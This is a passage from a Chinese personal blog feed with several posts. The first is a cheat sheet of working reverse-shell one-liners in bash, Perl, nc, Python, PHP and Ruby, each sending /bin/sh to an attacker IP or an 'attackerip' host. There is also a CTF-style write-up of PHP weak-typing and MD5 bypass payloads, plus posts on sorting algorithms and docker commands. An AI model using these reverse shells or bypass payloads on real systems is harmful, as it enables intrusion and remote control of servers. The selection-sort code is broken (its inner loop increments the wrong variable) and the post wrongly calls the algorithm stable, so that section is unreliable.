    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在服务器基本上都是采用linux系统，做为一条web狗，最希望当然是拿到网站的webshell，之前看到过几种方法，在这里总结一下吧。<br>这里攻击端的ip为192.168.1.100,并且执行了<code>nc -lvvp 9999</code>，在9999端口进行监听。</p><h1 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h1><p>bash是linux最基本的东西，用bash来反弹shell是必须要清楚的。<br>    <code>bash -i &gt;&amp; /dev/tcp/192.168.1.100/9999 0&gt;&amp;1</code><br>这里的可选择的协议还有udp，但是一般采用的tcp协议。<br>这里的第一个&gt;&amp;是表示shell在后台运行。</p><h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><p>perl解释器在linux下基本也是预装的，但如今似乎用的人越来越少了，剩下它的正则表达式还在延续。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.1.100";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p><h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>nc命令在linux下也是常见的，不过docker里一般不会有nc。<br>    <code>nc -e /bin/sh 192.168.1.100 9999</code><br>-e代表程序重定向 将/bin/sh 重定向到远程端口</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><p>现在用python写后端的人也挺多的，有命令注入的话说不定可以直接搞事。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>php是世界上最好的语言！<br>    <code>php -r &#39;$sock=fsockopen(&quot;192.168.1.100&quot;,9999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><p>还记得之前某位老师说过Ruby会比python更火，然而现在身边会Ruby的人好像没多少。<br><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code><br>还有不依赖/bin/sh的shell<br><code>ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code><br>顺带一提如果在windows上要用Ruby反弹shell，则<br><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code><br>不过我想我可能永远用不上。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>lua现在都没看见了，在这里便不列出来了。通常都是nc，python，php，bash用的较多一点。好像php的shell还有另一种形式，记性太差，想不起来了。之后再补上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;现在服务器基本上都是采用linux系统，做为一条web狗，最希望当然是拿到网站的webshell，之前看到过几种方法，在这里总结一下吧。&lt;b
      
    
    </summary>
    
    
      <category term="linux" scheme="http://zcluslloye.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>经典算法之选择排序</title>
    <link href="http://zcluslloye.cn/2018/05/11/selectsort/"/>
    <id>http://zcluslloye.cn/2018/05/11/selectsort/</id>
    <published>2018-05-11T11:20:28.000Z</published>
    <updated>2018-06-03T07:03:57.893Z</updated>
    
    <content type="html"><![CDATA[<p>最近都没时间写文章，想想还是得偶尔空出点时间来写文章学习点东西。<br>讲讲选择排序。<br>选择排序和冒泡排序都是比较基本的排序算法，下面就来简单说说选择排序的实现方法。<br>设数组的下标为[0…n-1]，i=0。刚开始整个数组都处于无序状态，在无序区中找到一个最小的数放在第i个位置，则现在[0..i]处于有序区，i++并重复步骤，直到i==n-1，则排序完成。</p><h2 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectsort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,MinIndex;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        MinIndex = i;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;n;k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[MinIndex])</span><br><span class="line">                MinIndex = j;</span><br><span class="line">        &#125;</span><br><span class="line">        Swap(a[i],a[MinIndex]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Swap的实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(<span class="keyword">int</span> &amp;a, <span class="keyword">int</span> &amp;b)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> c = a;  </span><br><span class="line">    a = b;  </span><br><span class="line">    b = c;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>选择排序和冒泡排序的时间复杂度都是n^2,并且都是稳定的排序，但当数组长度过大时，效率反而低下。下次讲讲时间复杂度也是n^2的插入排序法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近都没时间写文章，想想还是得偶尔空出点时间来写文章学习点东西。&lt;br&gt;讲讲选择排序。&lt;br&gt;选择排序和冒泡排序都是比较基本的排序算法，下面就来简单说说选择排序的实现方法。&lt;br&gt;设数组的下标为[0…n-1]，i=0。刚开始整个数组都处于无序状态，在无序区中找到一个最小的数
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>docker常用命令汇总</title>
    <link href="http://zcluslloye.cn/2018/04/24/docker/"/>
    <id>http://zcluslloye.cn/2018/04/24/docker/</id>
    <published>2018-04-24T12:20:00.000Z</published>
    <updated>2018-06-03T07:05:49.536Z</updated>
    
    <content type="html"><![CDATA[<p>最近事有点多，一直没啥时间写文章。但是忙不能成为不学习的理由，还是抽空写下文章吧。<br><br>因为出题目的原因，docker也开始频繁使用了，之前看了两本docker相关的书，但都不满意书的内容，可能是写的太杂太乱。借这个机会总结一下常用的命令方便自己忘记的时候查找吧。<br><br>搜索docker镜像：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search [镜像名]</span><br><span class="line">docker search ubuntu</span><br></pre></td></tr></table></figure><br>下载镜像:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [镜像名]</span><br></pre></td></tr></table></figure><br>列出所有已下载的镜像:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><br>启动一个容器并绑定端口挂载目录:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//后台方式启动</span><br><span class="line">docker run -dit -p [主机端口]:[容器端口] -v [主机目录]:[docker目录] --name [命名容器名称] [镜像名]:[标签] </span><br><span class="line">//创建完直接进入容器</span><br><span class="line">docker run -it -p [主机端口]:[容器端口] -v [主机目录]:[docker目录] --name [命名容器名称] [镜像名]:[标签] </span><br></pre></td></tr></table></figure><br>列出所有容器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><br>进入一个容器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach [容器ID]</span><br></pre></td></tr></table></figure><br>从容器中退出:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//后台继续运行容器</span><br><span class="line">Ctrl+p+q</span><br><span class="line">//退出并停止容器</span><br><span class="line">Ctrl+d</span><br></pre></td></tr></table></figure><br>启动/关闭/重启容器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker start [容器ID] //适用于已创建的容器</span><br><span class="line">docker stop [容器ID]</span><br><span class="line">docker restart [容器ID]</span><br></pre></td></tr></table></figure><br>将容器保存为镜像:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit [容器ID] [新镜像名称]:[新镜像标签] </span><br></pre></td></tr></table></figure><br>docker的命令还有很多，这里只列出了部分常用的，比如dockerfile的使用我就没用列出来。其他如果以后常用再接着补上吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近事有点多，一直没啥时间写文章。但是忙不能成为不学习的理由，还是抽空写下文章吧。&lt;br&gt;&lt;br&gt;因为出题目的原因，docker也开始频繁使用了，之前看了两本docker相关的书，但都不满意书的内容，可能是写的太杂太乱。借这个机会总结一下常用的命令方便自己忘记的时候查找吧。
      
    
    </summary>
    
    
      <category term="linux" scheme="http://zcluslloye.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>经典算法之冒泡排序</title>
    <link href="http://zcluslloye.cn/2018/04/11/bubblesort/"/>
    <id>http://zcluslloye.cn/2018/04/11/bubblesort/</id>
    <published>2018-04-11T12:22:00.000Z</published>
    <updated>2018-06-03T07:06:07.511Z</updated>
    
    <content type="html"><![CDATA[<p>冒泡排序法应该是大家最初接触到的排序算法，冒泡排序法简单而且非常容易理解，下面我就以升序为例讲解。<br>设数组的长度为N，比较相邻的两个元素，把其中大的那个数交换放在后面。对第0个到第N-1个数进行遍历之后，最大的数已经“沉”到最后一个，接下来对第0个到第N-2个数进行遍历，直到排序完成。<br><br><br>很容易就写出源码。</p><h2 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">       <span class="keyword">int</span> i, j;  </span><br><span class="line">       <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)  </span><br><span class="line">              <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; n - i; j++)  </span><br><span class="line">                     <span class="keyword">if</span> (a[j - <span class="number">1</span>] &gt; a[j])  </span><br><span class="line">                            swap(a[j - <span class="number">1</span>], a[j]);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>显然，冒泡排序法的时间复杂度为n*n，效率低下，对于大数组不建议使用冒泡排序法。当然<a href="https://blog.csdn.net/morewindows/article/details/6657829" target="_blank" rel="noopener">网上</a>也有许多对冒泡排序法的优化，这里我便不详讲。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;冒泡排序法应该是大家最初接触到的排序算法，冒泡排序法简单而且非常容易理解，下面我就以升序为例讲解。&lt;br&gt;设数组的长度为N，比较相邻的两个元素，把其中大的那个数交换放在后面。对第0个到第N-1个数进行遍历之后，最大的数已经“沉”到最后一个，接下来对第0个到第N-2个数进行遍
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP弱类型总结</title>
    <link href="http://zcluslloye.cn/2018/03/30/php-weak1/"/>
    <id>http://zcluslloye.cn/2018/03/30/php-weak1/</id>
    <published>2018-03-30T12:30:34.000Z</published>
    <updated>2018-06-03T07:07:00.509Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近强网杯还有其他比赛中，出现了许多php弱类型的题目。用这篇文章总结一下到目前学到的php弱类型。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>学过php的都知道，php中有两种比较符==和===。<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较<br>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>如果一个字符串和数字比较，则字符串会被转换成数值。例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"abc"</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1abc"</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0abc"</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"abc1"</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">"abc0"</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">"0e123"</span>==<span class="string">"0e456"</span>);<span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>当”abc”==0 比较时，abc会被转换成数值，由于是字符串所以abc转换成0<br>而abc0和abc1却等于false，这是因为一个字符串刚开始的值决定了这个字符串的数值，如果该字符串以合法的数值开始，则使用该数值，否正值为0。例如1abc为true,0abc为false<br>而0e开头的字符串会被识别为科学记数法，而0的多少次方都为0，所以0e123==0e456.</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><p>json绕过我在<a href="http://zcluslloye.cn/2018/03/12/hgame-web" target="_blank">web篇总结1</a>中有稍微提到过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>]))&#123;</span><br><span class="line">    $pattern = <span class="string">'/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/'</span>;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match($pattern,$key)===<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"format error"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $lock<span class="string">"************"</span>;</span><br><span class="line">        $b = json_decode($key);</span><br><span class="line">        <span class="keyword">if</span>($b==$lock)</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"wrong key"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>输入一个json类型的字符串进行json_decode，判断key是否等于lock的值，但是lock的值我们不知道，但是我们可以利用前面所说的0==”string”来绕过。而要求key要含有字母，我们就可以用0e开头的字符串来实现。<br>payload：key=0e123456</p><h2 id="strcmp漏洞绕过"><a href="#strcmp漏洞绕过" class="headerlink" title="strcmp漏洞绕过"></a>strcmp漏洞绕过</h2><p>要求 php -v &lt; 5.3<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'str1'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'str2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'str1'</span>]!=$_GET[<span class="string">'str2'</span>] &amp;&amp; strcmp($_GET[<span class="string">'str1'</span>],$_GET[<span class="string">'str2'</span>])==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>strcmp函数在php中用与比较两个字符串。<br>那如果传入的参数为数组会怎样呢？<br>我们传入str1[]=1&amp;str2[]=2,这时函数接受了不符合的类型，会返回NULL==NULL，也就判断类型相等。<br>payload：str1[]=1&amp;str2[]=2</p><h2 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">    $pattern = <span class="string">'/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;4,&#125;$/'</span>;</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match($pattern,$a)===<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"format error"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>($a)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"error.."</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"error.."</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"error.."</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原理和之前讲的大同小异，由于有正则表达式进行匹配所以a中必须含有字母，利用”4abc”==4便可绕过switch<br>payload：a=4abc</p><h2 id="MD5类型绕过"><a href="#MD5类型绕过" class="headerlink" title="MD5类型绕过"></a>MD5类型绕过</h2><p>强网杯web签到题就出了三道绕过MD5函数的题目，下面就以这道来总结一下。<br>第一关：</p><h3 id="MD5弱类型"><a href="#MD5弱类型" class="headerlink" title="MD5弱类型"></a>MD5弱类型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'str1'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'str2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'str1'</span>] != $_GET[<span class="string">'str2'</span>] &amp;&amp; md5($_GET[<span class="string">'str1'</span>]) == md5($_GET[<span class="string">'str2'</span>]))</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"something error..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一关就是传入两个字符串，两个字符串不相等，但是md5加密后相等，前面提到过0e开头的字符串在比较时会被视为科学记数法，所以两个0e开头的字符串会被认为相等。即：md5(‘s878926199a’) == md5(‘QNKCDZO’)<br>在网上找了一些md5加密后为0e开头的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure><br>payload：str1=QNKCDZO&amp;str2=s878926199a</p><p>第二关：</p><h3 id="MD5数组绕过"><a href="#MD5数组绕过" class="headerlink" title="MD5数组绕过"></a>MD5数组绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'str1'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'str2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'str1'</span>] !== $_GET[<span class="string">'str2'</span>] &amp;&amp; md5($_GET[<span class="string">'str1'</span>]) === md5($_GET[<span class="string">'str2'</span>]))</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"something error..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于MD5比较换成了强类型，这就导致参数传入且MD5加密后被转换成了相同的类型之后才进行比较，所以以0e开头的字符串不再以数值来进行比较，而由于md5函数无法处理数组，我们可以传入数组，md5函数就会返回NULL，也就判断NULL===NULL，成功绕过。<br>payload：str1[]=1&amp;str2[]=2<br>之前的md5弱类型也可以用此方法绕过。由此可知，数组可以绕过很多函数，例如strcmp还有md5。<br><br></p><p>第三关：</p><h3 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'str1'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'str2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>((string)$_GET[<span class="string">'str1'</span>] !== (string)$_GET[<span class="string">'str2'</span>] &amp;&amp; md5($_GET[<span class="string">'str1'</span>]) === md5($_GET[<span class="string">'str2'</span>]))</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"something error..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这关就不再属于弱类型了。由于先将参数转为<br>string后，如果我们传入数组会返回NULL，导致NULL==NULL，第一个条件绕过失败。<br>所以我们需要找到两个md5值相等的字符串。有这样的字符串吗？还真有。<br><a href="https://www.mscs.dal.ca/~selinger/md5collision/" target="_blank" rel="noopener">https://www.mscs.dal.ca/~selinger/md5collision/</a><br>资料里给出了两个字符串的16进制值，我们只需要将两个16进制值转为字符串提交即可。但需要注意，由于有不可见字符需要使用脚本提交。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1 = &quot;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&quot;</span><br><span class="line">str2 = &quot;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&quot;</span><br></pre></td></tr></table></figure><br>脚本就不贴了。记得decode(‘hex’)就行了。</p><h1 id="总结"><a href="#总结" class="headerlink" 